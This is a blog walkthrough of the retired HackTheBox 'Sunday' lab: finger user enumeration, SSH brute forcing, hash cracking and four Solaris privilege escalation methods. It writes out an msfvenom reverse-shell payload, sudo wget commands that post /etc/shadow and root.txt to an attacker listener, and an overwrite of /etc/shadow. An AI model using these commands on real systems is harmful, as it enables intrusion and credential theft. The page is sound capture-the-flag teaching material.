<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Sunday Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-sunday-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-10-01T14:35:30+00:00">October 1, 2018</time><time class="updated" datetime="2025-07-05T15:10:52+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Sunday. Sunday is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Easy</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find user.txt and root.txt file in the victim’s machine.</span></p>
<h3><span style="color: #800000;">Penetration Methodology </span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong> </span></p>
<ul>
<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
<ul>
<li><span style="color: #000000;">Identify finger users (Metasploit)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploit </strong></span></p>
<ul>
<li><span style="color: #000000;">SSH Brute force </span></li>
<li><span style="color: #000000;">Access shell using SSH</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Method 1</span></li>
<li><span style="color: #000000;">Method 2</span></li>
<li><span style="color: #000000;">Method 3</span></li>
<li><span style="color: #000000;">Capture root.txt flag</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Walk-through</u></strong></span></p>
<h3><span style="color: #800000;">Scanning </span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP. The IP of Sunday is 10.10.10.76</span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A 10.10.10.76 --open</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EZPbLnejM68/W7It8i5P2cI/AAAAAAAAaig/bXzDE5jEgPgcao8cZMSMNHGKQdfG-B8LACLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
<p><span style="color: #000000;">So here, we notice very interesting result from nmap scan, here it shown <strong>port 79 is open</strong> for Sun Solaris fingered.  So I Googled for its exploit and found Metasploit exploit “Finger Service User Enumerator”.</span></p>
<p><span style="color: #000000;">Then I load Metasploit framework for Identify valid users through the finger service using a variety of tricks and therefore, use the following module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/finger/finger_users
msf auxiliary(scanner/finger/finger_users) &gt; set rhosts 10.10.10.76
msf auxiliary(scanner/finger/finger_users) &gt; set users_file /root/pentest/SecLists/Usernames/Names/names.txt
msf auxiliary(scanner/finger/finger_users) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-L1M0Bgj03HA/W7It-b9RAGI/AAAAAAAAai8/viYySLi_n_4P8nGu_1w1cTjOoXtfPT0jwCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Exploit</span></h3>
<p><span style="color: #000000;">So, basically it reviled so many usernames which it has found, now make a dictionary of the obtain username and password that will be helpful in SSH login brute force. </span></p>
<p><span style="color: #000000;">Here we have used “patator” for SSH login to launch brute force on port 22022 and execute the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=probable-v2-top1575.txt persistent=0</pre>
<p><span style="color: #000000;">Finally, we found the following the password of the user “sunny”.</span></p>
<p><span style="color: #000000;"><strong>Password:</strong>  sunday</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-lYCC-o6SxZg/W7IuBd6c_EI/AAAAAAAAajY/2RSRkqQdBT8KN1aIswHJxLTKQTpw9-taACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">But when we try to login into ssh by using above credential, it gave “<em>no matching key exchange method found</em>” error and also put some hint and drop the connection request.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-aHemGoP8BXo/W7IuBZv0ICI/AAAAAAAAajc/P7ERZM08Ins5njyVQO9eoqz8nDbfcIQHQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Then with little more research, I edit the following key to connect SSH and luckily obtain tty shell access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p22022
sudo -l</pre>
<p><span style="color: #000000;">Then I check sudo right for user sunny and notice he can run /root/troll as root without a password.</span></p>
<p><span style="color: #000000;">Lol!! Executing /root/troll was a troll. Further, I check the list for available list and directories, luckily I found <strong>shadow.backup</strong> inside the /backup directory.</span></p>
<p><span style="color: #000000;">Inside <strong>shadow.backup</strong>, I found hashes for users Sammy and Sunny.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-gjrzazidSl0/W7IuB7hWnII/AAAAAAAAajg/H9jlq7_eWBMWgSdHVAqnTUp3SFnIU7vRwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So we try to crack these hashes by using john the ripper and fortunately obtained the password in plaintext format “cooldude<strong>!</strong>” of user sammy.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FCJHiZd1Ym8/W7IuCKanwMI/AAAAAAAAajk/PtBn0mMz_G8UqK3xQEJKtKp6kd5vDYRcwCLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation Techniques </span></h3>
<p><span style="color: #000000;">There are multiple ways to escalated root privilege in this lab, in this article, we have applied 4-ways to escalated root privilege to get the root.txt file.</span></p>
<p><span style="color: #000000;">Now let’s switch from Sunny to Sammy and figure-out assigned sudo permission for him.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p><span style="color: #000000;">Great!! We found that he has the right to download any file as root by using <strong>wget </strong>command. Now let’s also enumerate system binaries having enabled SUID bit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">There so many binary files having SUID bit enabled, let’s exploit some of them to gain root privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eNkJ5AoLU2c/W7IuCfMY0fI/AAAAAAAAajo/6iXt-x_gRyMOx0-aMTplBlxBMwd4WKCgACLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><u>Method 1</u></span></h3>
<p><span style="color: #000000;">Now let’s generate a payload using msfvenom, thus you can execute the following command and run php server to transfer this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p solaris/x86/shell_reverse_tcp lhost=10.10.14.6 lport=5555 -f elf &gt; /root/Desktop/raj.elf
php -S 0.0.0.0:80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/---kwo0MVQys/W7IuCvrE5VI/AAAAAAAAajs/YYgl8-0zvD8yH8eLKHwLmLXH1g4GuJKcgCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Let’s download above <strong>raj.elf </strong>through wget inside /tmp directory and replace it from rsh binary.  Then start netcat listen in a new terminal to spawn tty shell of root privilege.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
sudo /usr/bin/wget 10.10.14.6/raj.elf -O /usr/bin/rsh
/usr/bin/rsh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-89-xQLpmf0I/W7It8k0bt6I/AAAAAAAAaik/6g_d83v8jkwN5Yi7_p7GMh7Cy5XYj4ASgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now when you will execute <strong>/usr/bin/rsh </strong>command, you get root privilege shell access as shown below in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id</pre>
<p><span style="color: #000000;">And as you can observe the <strong>euid=0</strong> for root, therefore, now let’s grab the root.txt file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-kSRsnkx5gps/W7It8iNOP9I/AAAAAAAAaio/jkgWcrntDkAHFmgGP9NeojIyp5o7wanTgCLcBGAs/s1600/11.png"/></strong></span></p>
<h3><span style="color: #800000;"><u>Method 2</u></span></h3>
<p><span style="color: #000000;">The pfexec program is used to execute commands with the attributes specified by the user’s profiles in the exec_attr(4) database. It is invoked by the profile shells, pfsh, pfcsh, and pfksh which are linked to the Bourne shell, C shell, and Korn shell, respectively.</span></p>
<p><span style="color: #000000;">From https://www.unix.com/man-page/all/1/pfexec/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dmbx25Uuup4/W7It9aVCl8I/AAAAAAAAais/ZdoiaWTx94Iux7ze9m2euKKUJTPg4R0eQCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now execute the following command to obtain root privilege shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pfexec bash
id
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;">So, in this lab challenge, we obtain root.txt file through four types of privilege escalation and there might be other ways also available to get the root.txt file. Try it yourself!!</span></p>
<p><span style="color: #000000;">Happy Hacking </span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-p5rXfP_pMgM/W7It9vIEQwI/AAAAAAAAaiw/DTas8ovFu4k3OG1hvwMFvvLm359Xu0zAgCLcBGAs/s1600/17.png"/></p>
<h3><span style="color: #800000;"><u>Method 3</u></span></h3>
<p><span style="color: #000000;">As we know that the sudo permission is available for the wget, thus we can use post-file option method to send the contents of any file for example /etc/password or /etc/shadow files.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-KEyVC1gKdl8/W7It9n0UTHI/AAAAAAAAai0/9j7jtQYq6TEuYMgTOIW84Yhh1LnZU9rZgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Therefore we execute the following command to post shadow file content on our local listening machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.6</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Cwa6_xNeNL0/W7It9_bPIvI/AAAAAAAAai4/YNYCdPimYzcTuEWxK8SrJm2Y4OHn9BoWQCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">And in the terminal where netcat listener is activated, you will get the content of shadow file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 80</pre>
<p><span style="color: #000000;">From the given image, you can observe that we have obtained the hash value of the root user. Either you can crack the hash value or can modify it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tgWMSK32Soc/W7It-7OLBSI/AAAAAAAAajA/6cxusG0RciIlbYfY92cw20Zzw_p-deE0gCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">So we have copied the above content in a text file and so that we can replace the hash value of user: root from the hash value of user: sunny.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iJvcA4_AiXA/W7It_cBNVnI/AAAAAAAAajE/EY8YmCjMN6AvdTIUnnV3sYPLTDTfEaiXQCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">In the given below image, you can observe that we have modified the root hash value by copying user sunny hashes, as we know that the password of sunny is “sunday”. Hence the new password for root will be sunday, now named the file as shadow and ready to transfer it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8LhuOJf4znE/W7It_8mdfnI/AAAAAAAAajI/KEhWt7yG0y0sgY3jm4H8Yt7jR_UZshsHwCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now download the above-modified shadow file in its original path i.e. /etc/shadow, so that it will overwrite the original shadow file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/wget 10.10.14.6/shadow -O /etc/shadow</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QWqt0ACL554/W7IuAZndW5I/AAAAAAAAajM/6JMutCjEslgnpuvLNbfUM30kEXuy95VgQCLcBGAs/s1600/24.png"/></span></p>
<h3><span style="color: #800000;"><u>Method 4</u></span></h3>
<p><span style="color: #000000;">Similarly, we can also post the content of the root.txt file directly to the listening machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.6</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3DoQS77k_po/W7IuA1LFctI/AAAAAAAAajQ/FG5HhyiPWgctbGjaoOy97NlhU5duDZj4wCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">And in the terminal where netcat listener is activated, you will content of the root.txt file which is root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 80</pre>
<p><span style="color: #000000;">From the given image, you can observe that we have obtained the value of the root.txt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I4ITaWptYVc/W7IuBW4CL-I/AAAAAAAAajU/oWjHFU0g42k4q2vVwABbCVUZUQMyj4-OQCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
